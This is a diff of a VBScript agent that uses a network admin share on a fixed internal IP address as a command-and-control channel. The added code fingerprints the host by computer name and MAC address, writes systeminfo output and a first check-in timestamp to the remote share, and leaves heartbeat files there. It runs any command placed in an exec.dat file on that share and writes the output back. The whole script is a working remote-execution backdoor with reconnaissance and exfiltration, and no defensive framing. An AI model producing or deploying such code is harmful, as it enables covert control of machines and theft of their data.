@@ -1,40 +1,66 @@
-ServerShare = "\\172.16.47.189\D$"
+ServerName = "\\172.16.47.188"
+ShareName = "D$"
 ProjectName = "projectName"
 Set NetworkObject = CreateObject("WScript.Network")
 Set FSO = CreateObject("Scripting.FileSystemObject")
 
 'NetworkObject.MapNetworkDrive "", ServerShare, False, UserName, Password'
-
-
+ServerShare = ServerName & "\" & ShareName
 projectDir = ServerShare & "\" & ProjectName
 
 If NOT (FSO.FolderExists(projectDir)) Then
 	FSO.CreateFolder(projectDir)
 End If
 
+'Get The First MAC address'
 Set WMI = GetObject("winmgmts:\\.\root\cimv2")
-Set Nads = WMI.ExecQuery("Select * from Win32_NetworkAdapter where physicaladapter=true") 
-
+Set Nads = WMI.ExecQuery("Select * from Win32_NetworkAdapter where physicaladapter=true")
 Dim Nad
 For Each Nad in Nads 
    macAddress = Nad.MACAddress
    exit for
 Next
 
-hostName = NetworkObject.ComputerName
-hostDir = projectDir & "\" & hostName & "-" & macAddress
+hostName = NetworkObject.ComputerName & "-" & macAddress
+hostDir = projectDir & "\" & hostName
 
 If NOT (FSO.FolderExists(hostDir)) Then
 	FSO.CreateFolder(hostDir)
 End If
 Set objShell = CreateObject("WScript.Shell") 
 
+'Setting the %PATH% variable in the execution environment'
 Set colVolEnvVars = objShell.Environment("Volatile")
 colVolEnvVars("PATH") = hostDir
 
+'File locations'
 execFile = hostDir & "\exec.dat"
+infoFile = hostDir & "\info.dat"
+outFile = hostDir & "\output.dat"
+pingFile = hostDir & "\ping.dat"
+checkinFile = hostDir & "\checkin.dat"
 Set colVolEnvVars = Nothing
 
+'File that is created when the agent first Checks-in'
+If not FSO.FileExists(checkinFile) Then
+	Set oExec = objShell.Exec("%comspec% /c date /t && time /t")
+	Set objFile = FSO.CreateTextFile(checkinFile, 1)
+	objFile.write(oExec.StdOut.ReadAll() & oExec.StdErr.ReadAll())
+End If
+
+'File that lists the hosts information'
+If not FSO.FileExists(infoFile) Then
+	Set oExec = objShell.Exec("%comspec% /c systeminfo")
+	Set objFile = FSO.CreateTextFile(infoFile, 1)
+	objFile.write(oExec.StdOut.ReadAll() & oExec.StdErr.ReadAll())
+End If
+
+'File that "changes" every time the script is run'
+Set objFile = FSO.CreateTextFile(pingFile, 1)
+objFile.write("")
+
+
+'File that contains a command'
 If FSO.FileExists(execFile) Then
 
 	Set execObjFile = FSO.OpenTextFile(execFile,1)
@@ -45,7 +71,6 @@ If FSO.FileExists(execFile) Then
 	Set oExec = objShell.Exec(command)
 
 
-	outFile = hostDir & "\output.dat"
 	If NOT (FSO.FileExists(outFile)) Then
 		Set objFile = FSO.CreateTextFile(outFile, 1)
 	Else
@@ -57,19 +82,6 @@ If FSO.FileExists(execFile) Then
 	objFile.Close
 	execObjFile.Close
 	FSO.DeleteFile execFile 
-	Set execObjFile = Nothing
-	Set objShell = Nothing
-	set oExec = Nothing
-	Set objFile = Nothing
 
 End If
-
-Set Directory = Nothing
-Set FSO = Nothing
-
 'NetworkObject.RemoveNetworkDrive ServerShare, True, False'
-
-Set ShellObject = Nothing
-Set NetworkObject = Nothing
-Set WMI = Nothing
-Set Nads = Nothing
